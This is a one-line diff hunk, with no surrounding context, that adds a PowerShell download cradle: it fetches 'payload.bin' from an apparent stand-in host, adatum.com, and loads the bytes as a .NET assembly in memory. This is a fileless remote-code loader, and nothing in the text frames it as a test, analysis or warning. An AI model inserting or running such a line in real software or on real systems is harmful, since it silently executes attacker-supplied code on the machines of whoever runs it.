@@ -1,0 +1,1 @@
+$AssemblyBytes = (New-Object System.Net.WebClient).DownloadData("https://adatum.com:443/payload.bin"); [Reflection.Assembly]::Load($AssemblyBytes); [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
